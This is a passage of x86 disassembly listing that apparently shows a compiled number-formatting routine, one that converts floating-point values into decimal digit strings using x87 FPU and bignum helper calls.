  408700:	sub    eax,0x1
  408703:	mov    edi,eax
  408705:	js     0x408f00
  40870b:	mov    eax,DWORD PTR [esp+0x1c]
  40870f:	test   eax,eax
  408711:	js     0x408ee0
  408717:	add    edi,eax
  408719:	mov    DWORD PTR [esp+0x50],eax
  40871d:	mov    DWORD PTR [esp+0x3c],0x0
  408725:	cmp    DWORD PTR [esp+0xa0],0x9
  40872d:	ja     0x408a10
  408733:	cmp    DWORD PTR [esp+0xa0],0x5
  40873b:	jle    0x408a1b
  408741:	sub    DWORD PTR [esp+0xa0],0x4
  408749:	xor    eax,eax
  40874b:	cmp    DWORD PTR [esp+0xa0],0x3
  408753:	je     0x4090f7
  408759:	jle    0x408e30
  40875f:	cmp    DWORD PTR [esp+0xa0],0x4
  408767:	mov    DWORD PTR [esp+0x40],0x1
  40876f:	je     0x408a40
  408775:	cmp    DWORD PTR [esp+0xa0],0x5
  40877d:	jne    0x408e46
  408783:	mov    ecx,DWORD PTR [esp+0x1c]
  408787:	add    ecx,DWORD PTR [esp+0xa4]
  40878e:	mov    DWORD PTR [esp+0x54],ecx
  408792:	add    ecx,0x1
  408795:	test   ecx,ecx
  408797:	mov    DWORD PTR [esp+0x2c],ecx
  40879b:	jle    0x409348
  4087a1:	cmp    ecx,0xe
  4087a4:	mov    DWORD PTR [esp+0x6c],ecx
  4087a8:	setbe  dl
  4087ab:	and    eax,edx
  4087ad:	mov    BYTE PTR [esp+0x48],al
  4087b1:	mov    eax,ecx
  4087b3:	mov    DWORD PTR [esp],eax
  4087b6:	call   0x4081b0
  4087bb:	mov    DWORD PTR [esp+0x38],eax
  4087bf:	mov    eax,DWORD PTR [esp+0x90]
  4087c6:	mov    eax,DWORD PTR [eax+0xc]
  4087c9:	sub    eax,0x1
  4087cc:	mov    DWORD PTR [esp+0x20],eax
  4087d0:	je     0x4087f6
  4087d2:	mov    ecx,DWORD PTR [esp+0x20]
  4087d6:	mov    eax,0x2
  4087db:	test   ecx,ecx
  4087dd:	cmovns eax,ecx
  4087e0:	and    ebx,0x8
  4087e3:	mov    DWORD PTR [esp+0x20],eax
  4087e7:	je     0x4087f6
  4087e9:	mov    eax,0x3
  4087ee:	sub    eax,DWORD PTR [esp+0x20]
  4087f2:	mov    DWORD PTR [esp+0x20],eax
  4087f6:	cmp    BYTE PTR [esp+0x48],0x0
  4087fb:	je     0x408af5
  408801:	mov    eax,DWORD PTR [esp+0x20]
  408805:	or     eax,DWORD PTR [esp+0x1c]
  408809:	jne    0x408af5
  40880f:	mov    eax,DWORD PTR [esp+0x44]
  408813:	fld    QWORD PTR [esp+0x10]
  408817:	mov    DWORD PTR [esp+0x6c],0x0
  40881f:	fst    QWORD PTR [esp+0x20]
  408823:	test   eax,eax
  408825:	je     0x408835
  408827:	fld1   
  408829:	fucomip st,st(1)
  40882b:	ja     0x4097b0
  408831:	fstp   st(0)
  408833:	jmp    0x408837
  408835:	fstp   st(0)
  408837:	fld    QWORD PTR [esp+0x20]
  40883b:	fadd   st,st(0)
  40883d:	fadd   DWORD PTR ds:0x40e044
  408843:	fstp   QWORD PTR [esp+0x48]
  408847:	mov    eax,DWORD PTR [esp+0x48]
  40884b:	mov    DWORD PTR [esp+0x10],eax
  40884f:	mov    eax,DWORD PTR [esp+0x4c]
  408853:	sub    eax,0x3400000
  408858:	mov    DWORD PTR [esp+0x14],eax
  40885c:	mov    eax,DWORD PTR [esp+0x2c]
  408860:	test   eax,eax
  408862:	je     0x408aa1
  408868:	mov    ecx,DWORD PTR [esp+0x2c]
  40886c:	fld    QWORD PTR [esp+0x20]
  408870:	mov    DWORD PTR [esp+0x48],0x0
  408878:	mov    ebx,DWORD PTR [esp+0x40]
  40887c:	test   ebx,ebx
  40887e:	je     0x40943d
  408884:	fld    DWORD PTR ds:0x40e04c
  40888a:	fnstcw WORD PTR [esp+0x5e]
  40888e:	movzx  eax,WORD PTR [esp+0x5e]
  408893:	mov    edx,DWORD PTR [esp+0x38]
  408897:	mov    DWORD PTR [esp+0x6c],0x0
  40889f:	fdiv   QWORD PTR [ecx*8+0x40e0b8]
  4088a6:	mov    ah,0xc
  4088a8:	lea    ebx,[edx+0x1]
  4088ab:	mov    WORD PTR [esp+0x5c],ax
  4088b0:	fsub   QWORD PTR [esp+0x10]
  4088b4:	fxch   st(1)
  4088b6:	fldcw  WORD PTR [esp+0x5c]
  4088ba:	fist   DWORD PTR [esp+0x10]
  4088be:	fldcw  WORD PTR [esp+0x5e]
  4088c2:	movzx  eax,BYTE PTR [esp+0x10]
  4088c7:	fild   DWORD PTR [esp+0x10]
  4088cb:	add    eax,0x30
  4088ce:	fsubp  st(1),st
  4088d0:	fxch   st(1)
  4088d2:	mov    BYTE PTR [edx],al
  4088d4:	fucomi st,st(1)
  4088d6:	ja     0x40896d
  4088dc:	fld    st(1)
  4088de:	fsubr  DWORD PTR ds:0x40e038
  4088e4:	fxch   st(1)
  4088e6:	fucomi st,st(1)
  4088e8:	fstp   st(1)
  4088ea:	ja     0x409515
  4088f0:	mov    eax,DWORD PTR [esp+0x6c]
  4088f4:	add    eax,0x1
  4088f7:	cmp    ecx,eax
  4088f9:	mov    DWORD PTR [esp+0x6c],eax
  4088fd:	jle    0x408ac9
  408903:	fld    DWORD PTR ds:0x40e03c
  408909:	jmp    0x40893b
  40890b:	nop
  40890c:	lea    esi,[esi+eiz*1+0x0]
  408910:	fld    st(1)
  408912:	fsubr  DWORD PTR ds:0x40e038
  408918:	fxch   st(1)
  40891a:	fucomi st,st(1)
  40891c:	fstp   st(1)
  40891e:	ja     0x40951b
  408924:	mov    eax,DWORD PTR [esp+0x6c]
  408928:	add    eax,0x1
  40892b:	cmp    ecx,eax
  40892d:	mov    DWORD PTR [esp+0x6c],eax
  408931:	jle    0x408acf
  408937:	fxch   st(1)
  408939:	fxch   st(2)
  40893b:	fmul   st(1),st
  40893d:	add    ebx,0x1
  408940:	fmul   st(2),st
  408942:	fxch   st(2)
  408944:	fldcw  WORD PTR [esp+0x5c]
  408948:	fist   DWORD PTR [esp+0x10]
  40894c:	fldcw  WORD PTR [esp+0x5e]
  408950:	movzx  eax,BYTE PTR [esp+0x10]
  408955:	fild   DWORD PTR [esp+0x10]
  408959:	add    eax,0x30
  40895c:	fsubp  st(1),st
  40895e:	fxch   st(1)
  408960:	mov    BYTE PTR [ebx-0x1],al
  408963:	fucomi st,st(1)
  408965:	jbe    0x408910
  408967:	fstp   st(0)
  408969:	fstp   st(1)
  40896b:	jmp    0x40896f
  40896d:	fstp   st(0)
  40896f:	fldz   
  408971:	fxch   st(1)
  408973:	mov    eax,DWORD PTR [esp+0x48]
  408977:	fucomip st,st(1)
  408979:	fstp   st(0)
  40897b:	jp     0x408983
  40897d:	je     0x40932a
  408983:	add    eax,0x1
  408986:	mov    edi,0x10
  40898b:	mov    DWORD PTR [esp+0x1c],eax
  40898f:	nop
  408990:	mov    DWORD PTR [esp],ebp
  408993:	call   0x409ce0
  408998:	mov    eax,DWORD PTR [esp+0xa8]
  40899f:	mov    esi,DWORD PTR [esp+0x1c]
  4089a3:	mov    BYTE PTR [ebx],0x0
  4089a6:	mov    DWORD PTR [eax],esi
  4089a8:	mov    eax,DWORD PTR [esp+0xac]
  4089af:	test   eax,eax
  4089b1:	je     0x4089bc
  4089b3:	mov    eax,DWORD PTR [esp+0xac]
  4089ba:	mov    DWORD PTR [eax],ebx
  4089bc:	mov    eax,DWORD PTR [esp+0x9c]
  4089c3:	or     DWORD PTR [eax],edi
  4089c5:	mov    eax,DWORD PTR [esp+0x38]
  4089c9:	add    esp,0x7c
  4089cc:	pop    ebx
  4089cd:	pop    esi
  4089ce:	pop    edi
  4089cf:	pop    ebp
  4089d0:	ret    
  4089d1:	mov    DWORD PTR [ebp+0x10],0x0
  4089d8:	mov    DWORD PTR [esp+0x28],0x0
  4089e0:	jmp    0x408528
  4089e5:	mov    DWORD PTR [esp+0x4],eax
  4089e9:	mov    DWORD PTR [esp],ebp
  4089ec:	call   0x4099a0
  4089f1:	mov    eax,DWORD PTR [esp+0x6c]
  4089f5:	mov    edi,DWORD PTR [esp+0x94]
  4089fc:	sub    DWORD PTR [esp+0x28],eax
  408a00:	add    edi,eax
  408a02:	mov    DWORD PTR [esp+0x30],edi
  408a06:	jmp    0x408547
  408a0b:	nop
  408a0c:	lea    esi,[esi+eiz*1+0x0]
  408a10:	mov    DWORD PTR [esp+0xa0],0x0
  408a1b:	add    ecx,0x3fe
  408a21:	cmp    ecx,0x7f7
  408a27:	setbe  al
  408a2a:	jmp    0x40874b
  408a2f:	nop
  408a30:	mov    DWORD PTR [esp+0x44],0x0
  408a38:	jmp    0x4086f2
  408a3d:	lea    esi,[esi+0x0]
  408a40:	mov    edx,DWORD PTR [esp+0xa4]
  408a47:	test   edx,edx
  408a49:	jle    0x409368
  408a4f:	cmp    DWORD PTR [esp+0xa4],0xe
  408a57:	setbe  dl
  408a5a:	mov    ecx,DWORD PTR [esp+0xa4]
  408a61:	and    edx,eax
  408a63:	mov    BYTE PTR [esp+0x48],dl
  408a67:	mov    DWORD PTR [esp+0x6c],ecx
  408a6b:	mov    eax,ecx
  408a6d:	mov    DWORD PTR [esp+0x54],ecx
  408a71:	mov    DWORD PTR [esp+0x2c],ecx
  408a75:	jmp    0x4087b3
  408a7a:	fstp   st(0)
  408a7c:	fld    QWORD PTR [esp+0x20]
  408a80:	fadd   st,st(0)
  408a82:	fadd   DWORD PTR ds:0x40e044
  408a88:	fstp   QWORD PTR [esp+0x48]
  408a8c:	mov    eax,DWORD PTR [esp+0x48]
  408a90:	mov    DWORD PTR [esp+0x10],eax
  408a94:	mov    eax,DWORD PTR [esp+0x4c]
  408a98:	sub    eax,0x3400000
  408a9d:	mov    DWORD PTR [esp+0x14],eax
  408aa1:	fld    QWORD PTR [esp+0x20]
  408aa5:	fsub   DWORD PTR ds:0x40e048
  408aab:	fld    QWORD PTR [esp+0x10]
  408aaf:	fxch   st(1)
  408ab1:	fucomi st,st(1)
  408ab3:	ja     0x409422
  408ab9:	fxch   st(1)
  408abb:	fchs   
  408abd:	fucomip st,st(1)
  408abf:	fstp   st(0)
  408ac1:	ja     0x408eb8
  408ac7:	jmp    0x408add
  408ac9:	fstp   st(0)
  408acb:	fstp   st(0)
  408acd:	jmp    0x408add
  408acf:	fstp   st(0)
  408ad1:	fstp   st(0)
  408ad3:	fstp   st(0)
  408ad5:	jmp    0x408add
  408ad7:	fstp   st(0)
  408ad9:	jmp    0x408add
  408adb:	fstp   st(0)
  408add:	mov    eax,DWORD PTR [esp+0x20]
  408ae1:	mov    edx,DWORD PTR [esp+0x24]
  408ae5:	mov    DWORD PTR [esp+0x20],0x0
  408aed:	mov    DWORD PTR [esp+0x10],eax
  408af1:	mov    DWORD PTR [esp+0x14],edx
  408af5:	mov    ecx,DWORD PTR [esp+0x30]
  408af9:	test   ecx,ecx
  408afb:	js     0x408ba0
  408b01:	mov    ebx,DWORD PTR [esp+0x90]
  408b08:	mov    eax,DWORD PTR [esp+0x1c]
  408b0c:	cmp    eax,DWORD PTR [ebx+0x14]
  408b0f:	jg     0x408ba0
  408b15:	mov    esi,DWORD PTR [esp+0x2c]
  408b19:	fld    QWORD PTR [eax*8+0x40e0c0]
  408b20:	test   esi,esi
  408b22:	jg     0x40925f
  408b28:	mov    eax,DWORD PTR [esp+0xa4]
  408b2f:	shr    eax,0x1f
  408b32:	test   al,al
  408b34:	je     0x40925f
  408b3a:	test   esi,esi
  408b3c:	jne    0x408eb6
  408b42:	fmul   DWORD PTR ds:0x40e048
  408b48:	fld    QWORD PTR [esp+0x10]
  408b4c:	fxch   st(1)
  408b4e:	fucomip st,st(1)
  408b50:	fstp   st(0)
  408b52:	jae    0x408eb8
  408b58:	mov    eax,DWORD PTR [esp+0x1c]
  408b5c:	mov    DWORD PTR [esp+0x10],0x0
  408b64:	xor    esi,esi
  408b66:	add    eax,0x2
  408b69:	mov    DWORD PTR [esp+0x1c],eax
  408b6d:	mov    eax,DWORD PTR [esp+0x38]
  408b71:	mov    edi,0x20
  408b76:	lea    ebx,[eax+0x1]
  408b79:	mov    BYTE PTR [eax],0x31
  408b7c:	mov    eax,DWORD PTR [esp+0x10]
  408b80:	mov    DWORD PTR [esp],eax
  408b83:	call   0x409ce0
  408b88:	test   esi,esi
  408b8a:	je     0x408990
  408b90:	mov    DWORD PTR [esp],esi
  408b93:	call   0x409ce0
  408b98:	jmp    0x408990
  408b9d:	lea    esi,[esi+0x0]
  408ba0:	mov    eax,DWORD PTR [esp+0x40]
  408ba4:	test   eax,eax
  408ba6:	je     0x408f30
  408bac:	mov    ebx,DWORD PTR [esp+0x90]
  408bb3:	sub    esi,DWORD PTR [esp+0x28]
  408bb7:	mov    ecx,DWORD PTR [esp+0x30]
  408bbb:	mov    edx,DWORD PTR [ebx+0x4]
  408bbe:	lea    eax,[esi+0x1]
  408bc1:	sub    ecx,esi
  408bc3:	cmp    ecx,edx
  408bc5:	mov    DWORD PTR [esp+0x6c],eax
  408bc9:	jge    0x408bfd
  408bcb:	mov    esi,DWORD PTR [esp+0xa0]
  408bd2:	lea    ecx,[esi-0x3]
  408bd5:	and    ecx,0xfffffffd
  408bd8:	je     0x408bfd
  408bda:	mov    eax,DWORD PTR [esp+0x30]
  408bde:	mov    esi,DWORD PTR [esp+0x2c]
  408be2:	sub    eax,edx
  408be4:	add    eax,0x1
  408be7:	test   esi,esi
  408be9:	setg   cl
  408bec:	cmp    esi,eax
  408bee:	mov    DWORD PTR [esp+0x6c],eax
  408bf2:	setl   dl
  408bf5:	test   cl,dl
  408bf7:	je     0x40937d
  408bfd:	cmp    DWORD PTR [esp+0xa0],0x1
  408c05:	jle    0x40937d
  408c0b:	mov    esi,DWORD PTR [esp+0x3c]
  408c0f:	mov    eax,DWORD PTR [esp+0x2c]
  408c13:	mov    edx,esi
  408c15:	sub    eax,0x1
  408c18:	sub    edx,eax
  408c1a:	cmp    esi,eax
  408c1c:	jge    0x408c2e
  408c1e:	mov    edx,eax
  408c20:	sub    edx,DWORD PTR [esp+0x3c]
  408c24:	mov    DWORD PTR [esp+0x3c],eax
  408c28:	add    DWORD PTR [esp+0x50],edx
  408c2c:	xor    edx,edx
  408c2e:	mov    eax,DWORD PTR [esp+0x2c]
  408c32:	test   eax,eax
  408c34:	js     0x4096a0
  408c3a:	mov    ebx,DWORD PTR [esp+0x34]
  408c3e:	mov    DWORD PTR [esp+0x6c],eax
  408c42:	mov    DWORD PTR [esp],0x1
  408c49:	mov    DWORD PTR [esp+0x10],edx
  408c4d:	add    edi,eax
  408c4f:	add    DWORD PTR [esp+0x34],eax
  408c53:	call   0x409e40
  408c58:	mov    edx,DWORD PTR [esp+0x10]
  408c5c:	mov    esi,eax
  408c5e:	test   edi,edi
  408c60:	jle    0x408c79
  408c62:	test   ebx,ebx
  408c64:	jle    0x408c79
  408c66:	cmp    edi,ebx
  408c68:	mov    eax,ebx
  408c6a:	cmovle eax,edi
  408c6d:	sub    DWORD PTR [esp+0x34],eax
  408c71:	mov    DWORD PTR [esp+0x6c],eax
  408c75:	sub    ebx,eax
  408c77:	sub    edi,eax
  408c79:	mov    eax,DWORD PTR [esp+0x3c]
  408c7d:	test   eax,eax
  408c7f:	jle    0x408cd1
  408c81:	mov    ecx,DWORD PTR [esp+0x40]
  408c85:	test   ecx,ecx
  408c87:	je     0x4090e0
  408c8d:	test   edx,edx
  408c8f:	jle    0x408cc5
  408c91:	mov    DWORD PTR [esp+0x4],edx
  408c95:	mov    DWORD PTR [esp],esi
  408c98:	mov    DWORD PTR [esp+0x30],edx
  408c9c:	call   0x409ff0
  408ca1:	mov    DWORD PTR [esp+0x4],ebp
  408ca5:	mov    DWORD PTR [esp],eax
  408ca8:	mov    esi,eax
  408caa:	call   0x409e70
  408caf:	mov    DWORD PTR [esp],ebp
  408cb2:	mov    DWORD PTR [esp+0x10],eax
  408cb6:	call   0x409ce0
  408cbb:	mov    eax,DWORD PTR [esp+0x10]
  408cbf:	mov    edx,DWORD PTR [esp+0x30]
  408cc3:	mov    ebp,eax
  408cc5:	mov    eax,DWORD PTR [esp+0x3c]
  408cc9:	sub    eax,edx
  408ccb:	jne    0x4090e4
  408cd1:	mov    DWORD PTR [esp],0x1
  408cd8:	call   0x409e40
  408cdd:	mov    ecx,DWORD PTR [esp+0x50]
  408ce1:	mov    DWORD PTR [esp+0x10],eax
  408ce5:	test   ecx,ecx
  408ce7:	jle    0x408df3
  408ced:	mov    DWORD PTR [esp+0x4],ecx
  408cf1:	mov    DWORD PTR [esp],eax
  408cf4:	call   0x409ff0
  408cf9:	cmp    DWORD PTR [esp+0xa0],0x1
  408d01:	mov    DWORD PTR [esp+0x10],eax
  408d05:	jg     0x408d12
  408d07:	cmp    DWORD PTR [esp+0x28],0x1
  408d0c:	je     0x4093b7
  408d12:	mov    DWORD PTR [esp+0x28],0x0
  408d1a:	mov    ecx,DWORD PTR [esp+0x10]
  408d1e:	mov    eax,DWORD PTR [ecx+0x10]
  408d21:	bsr    eax,DWORD PTR [ecx+eax*4+0x10]
  408d26:	xor    eax,0x1f
  408d29:	sub    eax,edi
  408d2b:	mov    edx,DWORD PTR [esp+0x34]
  408d2f:	sub    eax,0x4
  408d32:	and    eax,0x1f
  408d35:	add    edx,eax
  408d37:	mov    ecx,eax
  408d39:	mov    DWORD PTR [esp+0x6c],eax
  408d3d:	test   edx,edx
  408d3f:	jle    0x408d5b
  408d41:	mov    DWORD PTR [esp],ebp
  408d44:	mov    DWORD PTR [esp+0x4],edx
  408d48:	mov    DWORD PTR [esp+0x30],eax
  408d4c:	call   0x40a160
  408d51:	mov    ecx,DWORD PTR [esp+0x30]
  408d55:	mov    ebp,eax
  408d57:	mov    eax,DWORD PTR [esp+0x6c]
  408d5b:	add    eax,edi
  408d5d:	test   eax,eax
  408d5f:	jle    0x408d7d
  408d61:	mov    DWORD PTR [esp+0x4],eax
  408d65:	mov    eax,DWORD PTR [esp+0x10]
  408d69:	mov    DWORD PTR [esp+0x30],ecx
  408d6d:	mov    DWORD PTR [esp],eax
  408d70:	call   0x40a160
  408d75:	mov    ecx,DWORD PTR [esp+0x30]
  408d79:	mov    DWORD PTR [esp+0x10],eax
  408d7d:	mov    eax,DWORD PTR [esp+0x44]
  408d81:	test   eax,eax
  408d83:	jne    0x409104
  408d89:	mov    eax,DWORD PTR [esp+0x2c]
  408d8d:	test   eax,eax
  408d8f:	jg     0x408f40
  408d95:	cmp    DWORD PTR [esp+0xa0],0x2
  408d9d:	jle    0x408f40
  408da3:	mov    eax,DWORD PTR [esp+0x2c]
  408da7:	test   eax,eax
  408da9:	jne    0x408ec2
  408daf:	mov    eax,DWORD PTR [esp+0x10]
  408db3:	mov    DWORD PTR [esp+0x8],0x0
  408dbb:	mov    DWORD PTR [esp+0x4],0x5
  408dc3:	mov    DWORD PTR [esp],eax
  408dc6:	call   0x409d50
  408dcb:	mov    DWORD PTR [esp],ebp
  408dce:	mov    DWORD PTR [esp+0x4],eax
  408dd2:	mov    DWORD PTR [esp+0x10],eax
  408dd6:	call   0x40a290
  408ddb:	test   eax,eax
  408ddd:	jle    0x408ec2
  408de3:	mov    eax,DWORD PTR [esp+0x1c]
  408de7:	add    eax,0x2
  408dea:	mov    DWORD PTR [esp+0x1c],eax
  408dee:	jmp    0x408b6d
  408df3:	cmp    DWORD PTR [esp+0xa0],0x1
  408dfb:	jg     0x408e08
  408dfd:	cmp    DWORD PTR [esp+0x28],0x1
  408e02:	je     0x409715
  408e08:	mov    DWORD PTR [esp+0x28],0x0
  408e10:	mov    edx,DWORD PTR [esp+0x50]
  408e14:	mov    eax,0x1f
  408e19:	test   edx,edx
  408e1b:	je     0x408d29
  408e21:	jmp    0x408d1a
  408e26:	lea    esi,[esi+0x0]
  408e29:	lea    edi,[edi+eiz*1+0x0]
  408e30:	cmp    DWORD PTR [esp+0xa0],0x2
  408e38:	mov    DWORD PTR [esp+0x40],0x0
  408e40:	je     0x408a40
  408e46:	mov    DWORD PTR [esp+0x20],esi
  408e4a:	fild   DWORD PTR [esp+0x20]
  408e4e:	fmul   QWORD PTR ds:0x40e030
  408e54:	fldcw  WORD PTR [esp+0x5c]
  408e58:	fistp  DWORD PTR [esp+0x58]
  408e5c:	fldcw  WORD PTR [esp+0x5e]
  408e60:	mov    eax,DWORD PTR [esp+0x58]
  408e64:	add    eax,0x3
  408e67:	mov    DWORD PTR [esp],eax
  408e6a:	mov    DWORD PTR [esp+0x6c],eax
  408e6e:	call   0x4081b0
  408e73:	mov    DWORD PTR [esp+0x38],eax
  408e77:	mov    eax,DWORD PTR [esp+0x90]
  408e7e:	mov    eax,DWORD PTR [eax+0xc]
  408e81:	sub    eax,0x1
  408e84:	mov    DWORD PTR [esp+0x20],eax
  408e88:	jne    0x40938a
  408e8e:	mov    DWORD PTR [esp+0x40],0x1
  408e96:	mov    DWORD PTR [esp+0x54],0xffffffff
  408e9e:	mov    DWORD PTR [esp+0x2c],0xffffffff
  408ea6:	mov    DWORD PTR [esp+0xa4],0x0
  408eb1:	jmp    0x408af5
  408eb6:	fstp   st(0)
  408eb8:	mov    DWORD PTR [esp+0x10],0x0
  408ec0:	xor    esi,esi
  408ec2:	mov    eax,DWORD PTR [esp+0xa4]
  408ec9:	mov    ebx,DWORD PTR [esp+0x38]
  408ecd:	mov    edi,0x10
  408ed2:	neg    eax
  408ed4:	mov    DWORD PTR [esp+0x1c],eax
  408ed8:	jmp    0x408b7c
  408edd:	lea    esi,[esi+0x0]
  408ee0:	mov    eax,DWORD PTR [esp+0x1c]
  408ee4:	sub    DWORD PTR [esp+0x34],eax
  408ee8:	mov    DWORD PTR [esp+0x50],0x0
  408ef0:	neg    eax
  408ef2:	mov    DWORD PTR [esp+0x3c],eax
  408ef6:	jmp    0x408725
  408efb:	nop
  408efc:	lea    esi,[esi+eiz*1+0x0]
  408f00:	neg    edi
  408f02:	mov    DWORD PTR [esp+0x34],edi
  408f06:	xor    edi,edi
  408f08:	jmp    0x40870b
  408f0d:	lea    esi,[esi+0x0]
  408f10:	fild   DWORD PTR [esp+0x1c]
  408f14:	fucomip st,st(1)
  408f16:	fstp   st(0)
  408f18:	jp     0x408f20
  408f1a:	je     0x4086b0
  408f20:	sub    DWORD PTR [esp+0x1c],0x1
  408f25:	jmp    0x4086b0
  408f2a:	lea    esi,[esi+0x0]
  408f30:	mov    edx,DWORD PTR [esp+0x3c]
  408f34:	mov    ebx,DWORD PTR [esp+0x34]
  408f38:	xor    esi,esi
  408f3a:	jmp    0x408c5e
  408f3f:	nop
  408f40:	mov    edi,DWORD PTR [esp+0x40]
  408f44:	test   edi,edi
  408f46:	je     0x409175
  408f4c:	lea    eax,[ebx+ecx*1]
  408f4f:	test   eax,eax
  408f51:	jle    0x408f61
  408f53:	mov    DWORD PTR [esp],esi
  408f56:	mov    DWORD PTR [esp+0x4],eax
  408f5a:	call   0x40a160
  408f5f:	mov    esi,eax
  408f61:	mov    ebx,DWORD PTR [esp+0x28]
  408f65:	mov    DWORD PTR [esp+0x34],esi
  408f69:	test   ebx,ebx
  408f6b:	jne    0x4096cf
  408f71:	mov    ebx,DWORD PTR [esp+0x38]
  408f75:	mov    DWORD PTR [esp+0x6c],0x1
  408f7d:	mov    DWORD PTR [esp+0x28],ebx
  408f81:	mov    ebx,DWORD PTR [esp+0x34]
  408f85:	jmp    0x40906f
  408f8a:	lea    esi,[esi+0x0]
  408f90:	mov    DWORD PTR [esp],edx
  408f93:	mov    DWORD PTR [esp+0x34],eax
  408f97:	call   0x409ce0
  408f9c:	mov    eax,DWORD PTR [esp+0x34]
  408fa0:	mov    ecx,eax
  408fa2:	or     ecx,DWORD PTR [esp+0xa0]
  408fa9:	jne    0x408fc3
  408fab:	mov    edx,DWORD PTR [esp+0x20]
  408faf:	test   edx,edx
  408fb1:	jne    0x408fc3
  408fb3:	mov    ecx,DWORD PTR [esp+0x98]
  408fba:	test   BYTE PTR [ecx],0x1
  408fbd:	je     0x409876
  408fc3:	test   edi,edi
  408fc5:	js     0x409563
  408fcb:	or     edi,DWORD PTR [esp+0xa0]
  408fd2:	jne    0x408fe4
  408fd4:	mov    edi,DWORD PTR [esp+0x98]
  408fdb:	test   BYTE PTR [edi],0x1
  408fde:	je     0x409563
  408fe4:	test   eax,eax
  408fe6:	jle    0x408ff3
  408fe8:	cmp    DWORD PTR [esp+0x20],0x2
  408fed:	jne    0x40976a
  408ff3:	add    DWORD PTR [esp+0x28],0x1
  408ff8:	mov    eax,DWORD PTR [esp+0x28]
  408ffc:	mov    edi,eax
  408ffe:	movzx  eax,BYTE PTR [esp+0x30]
  409003:	mov    BYTE PTR [edi-0x1],al
  409006:	mov    eax,DWORD PTR [esp+0x2c]
  40900a:	cmp    DWORD PTR [esp+0x6c],eax
  40900e:	je     0x40979f
  409014:	mov    DWORD PTR [esp],ebp
  409017:	mov    DWORD PTR [esp+0x8],0x0
  40901f:	mov    DWORD PTR [esp+0x4],0xa
  409027:	call   0x409d50
  40902c:	cmp    esi,ebx
  40902e:	mov    ebp,eax
  409030:	mov    DWORD PTR [esp+0x8],0x0
  409038:	mov    DWORD PTR [esp+0x4],0xa
  409040:	mov    DWORD PTR [esp],esi
  409043:	je     0x4090d5
  409049:	call   0x409d50
  40904e:	mov    DWORD PTR [esp],ebx
  409051:	mov    DWORD PTR [esp+0x8],0x0
  409059:	mov    esi,eax
  40905b:	mov    DWORD PTR [esp+0x4],0xa
  409063:	call   0x409d50
  409068:	mov    ebx,eax
  40906a:	add    DWORD PTR [esp+0x6c],0x1
  40906f:	mov    eax,DWORD PTR [esp+0x10]
  409073:	mov    DWORD PTR [esp],ebp
  409076:	mov    DWORD PTR [esp+0x4],eax
  40907a:	call   0x408260
  40907f:	mov    edi,eax
  409081:	mov    DWORD PTR [esp+0x4],esi
  409085:	mov    DWORD PTR [esp],ebp
  409088:	add    edi,0x30
  40908b:	mov    DWORD PTR [esp+0x3c],eax
  40908f:	mov    DWORD PTR [esp+0x30],edi
  409093:	call   0x40a290
  409098:	mov    edi,eax
  40909a:	mov    eax,DWORD PTR [esp+0x10]
  40909e:	mov    DWORD PTR [esp+0x4],ebx
  4090a2:	mov    DWORD PTR [esp],eax
  4090a5:	call   0x40a2e0
  4090aa:	mov    edx,eax
  4090ac:	mov    eax,0x1
  4090b1:	mov    ecx,DWORD PTR [edx+0xc]
  4090b4:	test   ecx,ecx
  4090b6:	jne    0x408f90
  4090bc:	mov    DWORD PTR [esp+0x4],edx
  4090c0:	mov    DWORD PTR [esp],ebp
  4090c3:	mov    DWORD PTR [esp+0x34],edx
  4090c7:	call   0x40a290
  4090cc:	mov    edx,DWORD PTR [esp+0x34]
  4090d0:	jmp    0x408f90
  4090d5:	call   0x409d50
  4090da:	mov    esi,eax
  4090dc:	mov    ebx,eax
  4090de:	jmp    0x40906a
  4090e0:	mov    eax,DWORD PTR [esp+0x3c]
  4090e4:	mov    DWORD PTR [esp],ebp
  4090e7:	mov    DWORD PTR [esp+0x4],eax
  4090eb:	call   0x409ff0
  4090f0:	mov    ebp,eax
  4090f2:	jmp    0x408cd1
  4090f7:	mov    DWORD PTR [esp+0x40],0x0
  4090ff:	jmp    0x408783
  409104:	mov    eax,DWORD PTR [esp+0x10]
  409108:	mov    DWORD PTR [esp],ebp
  40910b:	mov    DWORD PTR [esp+0x30],ecx
  40910f:	mov    DWORD PTR [esp+0x4],eax
  409113:	call   0x40a290
  409118:	test   eax,eax
  40911a:	mov    ecx,DWORD PTR [esp+0x30]
  40911e:	jns    0x408d89
  409124:	mov    DWORD PTR [esp],ebp
  409127:	mov    DWORD PTR [esp+0x8],0x0
  40912f:	mov    DWORD PTR [esp+0x4],0xa
  409137:	sub    DWORD PTR [esp+0x1c],0x1
  40913c:	mov    DWORD PTR [esp+0x2c],ecx
  409140:	call   0x409d50
  409145:	mov    ebp,eax
  409147:	mov    eax,DWORD PTR [esp+0x40]
  40914b:	test   eax,eax
  40914d:	jne    0x409908
  409153:	mov    eax,DWORD PTR [esp+0x54]
  409157:	test   eax,eax
  409159:	jg     0x40916d
  40915b:	cmp    DWORD PTR [esp+0xa0],0x2
  409163:	mov    DWORD PTR [esp+0x2c],eax
  409167:	jg     0x408da3
  40916d:	mov    eax,DWORD PTR [esp+0x54]
  409171:	mov    DWORD PTR [esp+0x2c],eax
  409175:	mov    DWORD PTR [esp+0x28],esi
  409179:	mov    DWORD PTR [esp+0x6c],0x1
  409181:	mov    ebx,DWORD PTR [esp+0x38]
  409185:	mov    edi,DWORD PTR [esp+0x2c]
  409189:	mov    esi,DWORD PTR [esp+0x10]
  40918d:	jmp    0x4091af
  40918f:	nop
  409190:	mov    DWORD PTR [esp],ebp
  409193:	mov    DWORD PTR [esp+0x8],0x0
  40919b:	mov    DWORD PTR [esp+0x4],0xa
  4091a3:	call   0x409d50
  4091a8:	add    DWORD PTR [esp+0x6c],0x1
  4091ad:	mov    ebp,eax
  4091af:	mov    DWORD PTR [esp+0x4],esi
  4091b3:	mov    DWORD PTR [esp],ebp
  4091b6:	add    ebx,0x1
  4091b9:	call   0x408260
  4091be:	lea    edx,[eax+0x30]
  4091c1:	mov    BYTE PTR [ebx-0x1],dl
  4091c4:	cmp    DWORD PTR [esp+0x6c],edi
  4091c8:	jl     0x409190
  4091ca:	mov    esi,DWORD PTR [esp+0x28]
  4091ce:	mov    DWORD PTR [esp+0x30],edx
  4091d2:	mov    DWORD PTR [esp+0x28],0x0
  4091da:	mov    eax,DWORD PTR [esp+0x20]
  4091de:	test   eax,eax
  4091e0:	je     0x409644
  4091e6:	cmp    eax,0x2
  4091e9:	je     0x40967c
  4091ef:	cmp    DWORD PTR [ebp+0x10],0x1
  4091f3:	jle    0x409846
